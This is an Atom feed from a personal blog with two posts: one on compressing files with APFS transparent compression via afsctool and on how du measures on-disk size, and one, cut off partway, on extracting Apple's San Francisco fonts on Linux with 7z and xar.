<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.3">Jekyll</generator><link href="https://blog.xfbs.net/feed.xml" rel="self" type="application/atom+xml" /><link href="https://blog.xfbs.net/" rel="alternate" type="text/html" /><updated>2020-06-05T14:55:00+02:00</updated><id>https://blog.xfbs.net/</id><title type="html">xfbs:blog</title><subtitle>Personal blog of xfbs.</subtitle><entry><title type="html">APFS Compression on my MacBook</title><link href="https://blog.xfbs.net/posts/enabling-apfs-compression" rel="alternate" type="text/html" title="APFS Compression on my MacBook" /><published>2020-06-05T00:00:00+02:00</published><updated>2020-06-05T00:00:00+02:00</updated><id>https://blog.xfbs.net/posts/enabling-apfs-compression</id><content type="html" xml:base="https://blog.xfbs.net/posts/enabling-apfs-compression">&lt;p&gt;In this post, I will take a look at how transparent file compression can
be enabled on Apple machines using APFS, how effective it is and how we can
get information about the actual size of a file on disk from the kernel.&lt;/p&gt;

&lt;p&gt;I’ve tried a lot of different operating systems and hardware manufacturers, but
like a lot of people in computer science, I eventually got stuck with Apple’s
MacBook Pro. It’s well-known that Apple knows how much customers love their hardware, and
so they charge a lot of some things, such as SSD size. I don’t always go for
the biggest possible options, because as a student I can’t always afford to. 
As a result of this, I sometimes run into issues with not having enough disk
space on my system.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/mac-disk-usage.png&quot; alt=&quot;Disk Usage as reported by Daisy Disk on my MacBook Pro&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What I do in that case is go through my files and offload things I don’t
actually need to an external drive. However, looking at the output of
&lt;a href=&quot;https://daisydiskapp.com&quot;&gt;Daisy Disk&lt;/a&gt;, which is similar to GNOME’s
&lt;a href=&quot;https://wiki.gnome.org/action/show/Apps/DiskUsageAnalyzer?action=show&amp;amp;redirect=Apps%2FBaobab&quot;&gt;Disk Usage Analyzer&lt;/a&gt;,
but prettier and commercial, shows that there’s a few gigabytes of stuff
in my &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/&lt;/code&gt; folder.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/mac-disk-usage-usr-local.png&quot; alt=&quot;Disk Usage as reported by Daisy Disk on my MacBook Pro&quot; /&gt;&lt;/p&gt;

&lt;p&gt;That is where macOS’s package manager &lt;a href=&quot;https://brew.sh/&quot;&gt;Homebrew&lt;/a&gt; installs
things to, and also where my TeX Live installation sits. I figure that these
are both things that don’t change too often and are therefore prime candidates
for compression.&lt;/p&gt;

&lt;p&gt;Apple’s filesystems – HFS+, and APFS, which has recently replaced the former
on SSD media – both support transparent compression, meaning that the
filesystem itself handles the compression, and applications don’t (shouldn’t)
notice the difference.&lt;/p&gt;

&lt;p&gt;There is a tool that we can use to play with it, and try the compression.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git clone https://github.com/RJVB/afsctool
$ cd afsctool
$ brew install google-sparsehash zlib cmake pkgconfig
$ PKG_CONFIG_PATH=/usr/local/opt/zlib/lib/pkgconfig
$ mkdir build
$ cd build
$ cmake ..
$ make
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I ran into some issues building this and I had to run this command (taken
from &lt;a href=&quot;https://github.com/PointCloudLibrary/pcl/issues/2601&quot;&gt;here&lt;/a&gt;):&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo xcode-select -s /Library/Developer/CommandLineTools
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and then recreate the build folder and re-run &lt;code class=&quot;highlighter-rouge&quot;&gt;cmake&lt;/code&gt; in it to make it work,
I don’t exactly understand why that is, but it worked. The result of that is
an &lt;code class=&quot;highlighter-rouge&quot;&gt;afsctool&lt;/code&gt; binary, which can be used to play with compression.&lt;/p&gt;

&lt;p&gt;First, I figured I’d see how many files in my &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/&lt;/code&gt; are already
compressed. Who knows, maybe someone already had this idea. The tool accepts
a &lt;code class=&quot;highlighter-rouge&quot;&gt;-l&lt;/code&gt; switch, which lists files (in a given folder) which are already
compressed.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./afsctool -l /usr/local/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, it didn’t return anything, suggesting that I don’t have anything
that is compressed in there at the moment. That’s a good thing, it means that
I can try enabling it to see what it does.&lt;/p&gt;

&lt;p&gt;First, I decided to try and see what would happen if I compress the repository
of &lt;code class=&quot;highlighter-rouge&quot;&gt;afsctool&lt;/code&gt; using it.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ du -hd 0
4.4M    .
$ ./build/afsctool -c .
/Users/pelsen/Projects/Playground/afsctool/.:
Number of HFS+/APFS compressed files: 127
$ du -hd 0
1.6M    .
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, this already brings an improvement of more than 50% on this repository.&lt;/p&gt;

&lt;h2 id=&quot;querying-compressed-size&quot;&gt;Querying Compressed Size&lt;/h2&gt;

&lt;p&gt;The difference in size can be seen with &lt;code class=&quot;highlighter-rouge&quot;&gt;du&lt;/code&gt;. I wonder how &lt;code class=&quot;highlighter-rouge&quot;&gt;du&lt;/code&gt; actually gets
the true (compressed) size of the file. My first thought was that the &lt;code class=&quot;highlighter-rouge&quot;&gt;stat()&lt;/code&gt;
syscall might return the compressed size, but verifying that turned out to be
false.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ dd if=/dev/zero of=file bs=10k count=10
10+0 records in
10+0 records out
102400 bytes transferred in 0.000336 secs (304607610 bytes/sec)
$ ../fsdoc/tools/stat file | grep -E 'size|flags'
size:  102400
flags: 00000000 ()
$ du -hd 0 file
100K    file
$ ls -lah file
-rw-r--r--  1 pelsen  staff   100K Jun  5 11:55 file
$ ./build/afsctool -c file
File is already HFS+/APFS compressed.
$ ../fsdoc/tools/stat file | grep -E 'size|flags'
size:  102400
flags: 00000020 (compressed)
$ du -hd 0 file
4.0K    file
$ ls -lah file
-rw-r--r--  1 pelsen  staff   100K Jun  5 11:55 file
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, both &lt;code class=&quot;highlighter-rouge&quot;&gt;ls&lt;/code&gt; and the &lt;code class=&quot;highlighter-rouge&quot;&gt;stat()&lt;/code&gt; syscall return the size of the file contents,
not of the compressed size on disk. That means that &lt;code class=&quot;highlighter-rouge&quot;&gt;du&lt;/code&gt; must be using some
other mechanism to get the true file size. However, what we can see is that the
compressed flag is set on the file.&lt;/p&gt;

&lt;p&gt;To figure out how &lt;code class=&quot;highlighter-rouge&quot;&gt;du&lt;/code&gt; gets the actual on-disk size, I had to take a peek at
the &lt;a href=&quot;https://github.com/coreutils/coreutils/blob/master/src/du.c&quot;&gt;source code&lt;/a&gt;
and get a little refresher on the information that &lt;code class=&quot;highlighter-rouge&quot;&gt;stat()&lt;/code&gt; provides. This is
the struct that the &lt;code class=&quot;highlighter-rouge&quot;&gt;stat()&lt;/code&gt; syscall returns on macOS:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stat&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* when _DARWIN_FEATURE_64_BIT_INODE is defined */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dev_t&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;st_dev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;           &lt;span class=&quot;cm&quot;&gt;/* ID of device containing file */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mode_t&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;st_mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;          &lt;span class=&quot;cm&quot;&gt;/* Mode of file (see below) */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;nlink_t&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;st_nlink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;         &lt;span class=&quot;cm&quot;&gt;/* Number of hard links */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ino_t&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;st_ino&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;           &lt;span class=&quot;cm&quot;&gt;/* File serial number */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;uid_t&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;st_uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;           &lt;span class=&quot;cm&quot;&gt;/* User ID of the file */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;gid_t&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;st_gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;           &lt;span class=&quot;cm&quot;&gt;/* Group ID of the file */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dev_t&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;st_rdev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;          &lt;span class=&quot;cm&quot;&gt;/* Device ID */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timespec&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;st_atimespec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;     &lt;span class=&quot;cm&quot;&gt;/* time of last access */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timespec&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;st_mtimespec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;     &lt;span class=&quot;cm&quot;&gt;/* time of last data modification */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timespec&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;st_ctimespec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;     &lt;span class=&quot;cm&quot;&gt;/* time of last status change */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timespec&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;st_birthtimespec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* time of file creation(birth) */&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;off_t&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;st_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;          &lt;span class=&quot;cm&quot;&gt;/* file size, in bytes */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;blkcnt_t&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;st_blocks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;        &lt;span class=&quot;cm&quot;&gt;/* blocks allocated for file */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;blksize_t&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;st_blksize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;cm&quot;&gt;/* optimal blocksize for I/O */&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;st_flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;         &lt;span class=&quot;cm&quot;&gt;/* user defined flags for file */&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;st_gen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;           &lt;span class=&quot;cm&quot;&gt;/* file generation number */&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int32_t&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;st_lspare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;        &lt;span class=&quot;cm&quot;&gt;/* RESERVED: DO NOT USE! */&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int64_t&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;st_qspare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;     &lt;span class=&quot;cm&quot;&gt;/* RESERVED: DO NOT USE! */&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;st_blocks&lt;/code&gt; member returns the size of the file on disk, in units of
512 bytes (not in units of &lt;code class=&quot;highlighter-rouge&quot;&gt;st_blksize&lt;/code&gt;!). You can read this field using the
&lt;code class=&quot;highlighter-rouge&quot;&gt;stat&lt;/code&gt; command:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ stat -f &quot;%b&quot; file
40
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this case, the file has 40 blocks of 512 bytes, meaning that it is 20KB in
size on disk. And that is exactly how &lt;code class=&quot;highlighter-rouge&quot;&gt;du&lt;/code&gt; finds out the size of things. You
can see at &lt;a href=&quot;https://github.com/coreutils/coreutils/blob/master/src/du.c#L589&quot;&gt;du.c:598&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;duinfo_set&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dui&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;apparent_size&lt;/span&gt;
             &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAX&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;st_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
             &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uintmax_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ST_NBLOCKS&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ST_NBLOCKSIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time_mtime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_stat_mtime&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
             &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time_atime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_stat_atime&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
             &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_stat_ctime&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;ST_NBLOCKS&lt;/code&gt; macro fetches the &lt;code class=&quot;highlighter-rouge&quot;&gt;st_blocks&lt;/code&gt; member from the stat struct. The
&lt;code class=&quot;highlighter-rouge&quot;&gt;ST_NBLOCKSIZE&lt;/code&gt; I’m assuming is defined to be 512 somewhere.&lt;/p&gt;

&lt;h2 id=&quot;compressing-tex-live-installation&quot;&gt;Compressing TeX Live Installation&lt;/h2&gt;

&lt;p&gt;I love using LaTeX for all sorts of things, so I always have a TeX Live
installation on any of the systems I use. One downside with that is that
it does install a lot of things, which means that it ends up taking a lot
of disk space:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ du -hd 0 /usr/local/texlive
6.6G    /usr/local/texlive
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;But surely, I can cut that down by compressing the whole folder. Can’t I?
Let’s try it. To do this, I used an option to use a worker pool, in order
to make it a bit quicker.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo ./build/afsctool -c -j4 /usr/local/texlive
Adding /usr/local/texlive to queue
Starting 4 worker threads to process queue with 186099 items
 10% .. 21% .. 31% .. 41% .. 52% .. 63% .. 73% .. 84% .. 94%
Processed 186099 entries
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Running this took a minute, but it ended up working out, and reduced the
size of the folder by 2 GB:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;% du -hd 0 /usr/local/texlive/
4.5G    /usr/local/texlive/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is pretty good already, but I wonder if I can do better than that. The
tool offers some more advanced options, such as changing the compression level
or using another algorithm. To re-compress, I needed to decompress them
first, and then recompress it with a higher compression ratio.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo ./build/afsctool -d /usr/local/texlive
$ sudo ./build/afsctool -c -j4 -9 /usr/local/texlive
Adding /usr/local/texlive to queue
Starting 4 worker threads to process queue with 186099 items
 11% .. 21% .. 32% .. 42% .. 53% .. 63% .. 73% .. 84% .. 94%
Processed 186099 entries
$ du -hd 0 /usr/local/texlive
4.5G    /usr/local/texlive
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, even with the better compression rate, we still “only” save 2 GB
(which is 30%, so it’s very good, and I’m not complaining).&lt;/p&gt;

&lt;h2 id=&quot;compressing-homebrew-cellar&quot;&gt;Compressing Homebrew Cellar&lt;/h2&gt;

&lt;p&gt;Homebrew installs all packages into &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/Cellar&lt;/code&gt;, which on my system
takes up about 14GB. That includes binaries, but also header files and
documentation which should compress fairly well, I’d guess. That sounds like
another prime candidate for compression, so I gave that a shot as well.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ du -hd 0 /usr/local/Cellar
 14G    /usr/local/Cellar
$ time sudo ./build/afsctool -c -j4 /usr/local/Cellar
Adding /usr/local/Cellar to queue
Starting 4 worker threads to process queue with 291261 items
 11% .. 21% .. 31% .. 41% .. 52% .. 62% .. 72% .. 82% .. 92%
Processed 291261 entries
sudo ./build/afsctool -c -j4 /usr/local/Cellar  430.99s user 338.29s system 158% cpu 8:06.84 total
$ du -hd0 /usr/local/Cellar
5.4G    /usr/local/Cellar
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This saves me a whopping 10GB! That’s really good. With that and the TeX Live
compression, I’ve saved about 11GB already.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;APFS supports transparent file compression, just like HFS+. If you’re
on a system that is low on disk space, compressing static data can be worth
it and can be done easily with &lt;a href=&quot;https://github.com/RJVB/afsctool&quot;&gt;afsctool&lt;/a&gt;.
I was able to save about 11GB of storage easily. I might also set up a cron
job to compress my code projects folder periodically.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/disk-usage-after.png&quot; alt=&quot;Disk Usage reported by Daisy Disk after compression&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I don’t know why this feature isn’t more well-known. Apple uses it internally
for some files, but I’m not aware of any way to compress files from the UI. I
presume it just hasn’t been tested enough yet.&lt;/p&gt;</content><author><name></name></author><summary type="html">In this post, I will take a look at how transparent file compression can be enabled on Apple machines using APFS, how effective it is and how we can get information about the actual size of a file on disk from the kernel.</summary></entry><entry><title type="html">Installing Apple San Francisco Fonts on Linux</title><link href="https://blog.xfbs.net/posts/installing-apple-san-francisco-font-on-linux" rel="alternate" type="text/html" title="Installing Apple San Francisco Fonts on Linux" /><published>2020-06-04T00:00:00+02:00</published><updated>2020-06-04T00:00:00+02:00</updated><id>https://blog.xfbs.net/posts/installing-apple-san-francisco-font-on-linux</id><content type="html" xml:base="https://blog.xfbs.net/posts/installing-apple-san-francisco-font-on-linux">&lt;p&gt;Apple has always had a knack for producing and using high-quality typography.
Not too long ago, they switched the font for their UI from the classic
Helvetica Neue (a typeface originating from Switzerland, known for precision
watches) over to their own custom typeface, which they called San Francisco.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sf-pro-font.png&quot; alt=&quot;Apple SF Pro Font&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I like this font family so much that I’ve started using the monospaced variant
for my default Terminal font. It replaced the Menlo I was using before, which
is also very legible and has served me very well.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/alacritty-sf-mono.png&quot; alt=&quot;Alacritty with SF Mono Font&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I try to use the same software and configuration on different platforms. My
terminal emulator, Alacritty, is written in Rust and cross-platform. The tools
I use daily, which is mostly &lt;code class=&quot;highlighter-rouge&quot;&gt;tmux&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;vim&lt;/code&gt; for development, similarly work
on all platforms. However, Linux does not have the San Francisco typeface
available, out of the box, for licensing reasons.&lt;/p&gt;

&lt;p&gt;Apple offers downloads of its San Francisco fonts for free from its &lt;a href=&quot;https://developer.apple.com/fonts&quot;&gt;developer
page&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/apple-developer-fonts.png&quot; alt=&quot;Apple Developer Fonts Download Page&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I wanted to get those fonts installed on my Linux machines as well, so that
I can use exactly the same Alacritty configuration on all platforms. However,
they only offer the fonts as a &lt;code class=&quot;highlighter-rouge&quot;&gt;.dmg&lt;/code&gt; download, which is a disk image file and
is how software is typically distributed on macOS (it’s mounted rather than
uncompressed, so it behaves more like an inserted CD drive, and has the advantage
that you can run Applications from mounted, compressed disk images without
having to unpack them first). The question is, can I get Linux to extract
this somehow? After all, Apple’s macOS is heavily UNIX-based.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ wget -q https://developer.apple.com/design/downloads/SF-Font-Pro.dmg
$ file SF-Font-Pro.dmg
SF-Font-Pro.dmg: zlib compressed data
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Interesting, so a &lt;code class=&quot;highlighter-rouge&quot;&gt;.dmg&lt;/code&gt; file is just some zlib-compressed blob, similar to
how a &lt;code class=&quot;highlighter-rouge&quot;&gt;.tar.gz&lt;/code&gt; file is a gzip-compressed tar blob. The &lt;code class=&quot;highlighter-rouge&quot;&gt;7z&lt;/code&gt; command from the
&lt;code class=&quot;highlighter-rouge&quot;&gt;p7zip&lt;/code&gt; package can extract a surprising amount of archives, and it can easily
extract disk image files, too.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ 7z -oSF-Font-Pro x SF-Font-Pro.dmg
$ cd SF-Font-Pro
$ ls
SanFranciscoPro
$ ls SanFranciscoPro
'[HFS+ Private Data]'  'San Francisco Pro.pkg'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Okay, so this disk image file contains a &lt;code class=&quot;highlighter-rouge&quot;&gt;.pkg&lt;/code&gt; file. The HFS+ Private Data
folder can be ignored, as it is empty. What’s in the &lt;code class=&quot;highlighter-rouge&quot;&gt;.pkg&lt;/code&gt; file? Let’s find out.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cd SanFranciscoPro
$ file 'San Francisco Pro.pkg'
San Francisco Pro.pkg: xar archive version 1, SHA-1 checksum
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A XAR archive, Apple likes to use those. It’s similar to a TAR archive, but it
uses XML for the table of contents. We don’t have anything on Ubuntu to unpack
this natively, so we’ll have to build something. Thankfully, there’s some code
up on Google Code that we can compile and use to unpack this.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cd ~/Downloads
$ wget -q https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/xar/xar-1.5.2.tar.gz
$ tar xf xar-1.5.2.tar.gz
$ cd xar-1.5.2
$ ./configure
checking for gcc... gcc
...
$ make -j 4
...
$ ./src/xar --version
xar 1.5.2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After running this, we have a working build of XAR 1.5.2 in the &lt;code class=&quot;highlighter-rouge&quot;&gt;src/&lt;/code&gt; folder.
We can now use this to unpack the San Francisco Pro font package.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ mkdir unpacked &amp;amp;&amp;amp; cd unpacked
$ ../../../xar-1.5.2/src/xar -x -f '../San Francisco Pro.pkg'
$ ls -l
-rwxr-xr-x 1 patrick patrick 546 Oct 28  2019 Distribution
drwxr-xr-x 1 patrick patrick  26 Jun  4 11:34 Resources
